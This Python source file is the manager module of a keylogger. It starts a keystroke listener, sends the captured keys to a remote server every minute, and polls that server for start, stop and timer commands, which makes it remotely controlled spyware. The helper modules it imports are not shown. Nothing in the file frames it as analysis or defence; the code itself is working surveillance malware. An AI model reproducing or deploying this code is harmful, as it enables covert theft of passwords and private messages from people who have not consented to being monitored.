import time
import threading
from send_ping import SendPing
from send_data import SendData
from key_logger_service import KeyLoggerService
from update_status import UpdateStatus

class KeyLoggerManager:

    def __init__(self):
        self.service = KeyLoggerService()


    def start_key_logger(self):
        self.service.start_listener()
        generator = self.service.send_every_minute()
        for data in generator:
            data = {"data": data}
            server_commend = SendData().writing(data)
            if not server_commend:
                self.service.stop_listener()
                return False

    def start_keyLogger_timer(self, timer):
        self.service.start_listener()
        self.timer = threading.Timer(timer * 60, self.stop_listener_safely)
        self.timer.start()

        generator = self.service.send_every_minute()
        for data in generator:
            data = {"data": data}
            commend, new_timer = SendData().writing(data)

            # check for new commend stop/start/new timer
            if new_timer != timer:
                self.stop_listener_safely()
                break
            if not self.service.stop_event.is_set():
                UpdateStatus().update_status_and_timer()
                break
        return False
    
    def stop_listener_safely(self):
        with self.service.lock:
            if self.service.key_buffer:
                data = {"data": self.service.key_buffer}
                SendData().writing(data)
                self.service.clean_buffer()
        self.service.stop_listener()

    def start(self):
        is_listening = False
        while True:
            if not is_listening:
                commend_to_start, timer = SendPing().send()
                if timer > 0:
                    is_listening = self.start_keyLogger_timer(timer)
                elif commend_to_start:
                    is_listening = self.start_key_logger()
                else:
                    time.sleep(60)  
        
if __name__ == "__main__":
    manager = KeyLoggerManager()
    manager.start()
